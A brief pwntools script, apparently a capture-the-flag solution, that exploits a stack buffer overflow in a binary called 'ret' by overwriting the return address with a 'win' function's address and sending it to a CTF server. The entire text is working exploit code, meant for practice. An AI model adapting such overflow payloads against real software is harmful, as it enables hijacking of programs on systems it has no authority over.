from pwn import *

exe = context.binary = ELF('ret')

winaddr = exe.symbols['win']

io = remote("ctf.hackucf.org", 9003)

payload = fit({
    64: 0xdeadbeef,
    80: winaddr
})

io.sendline(payload)
io.interactive()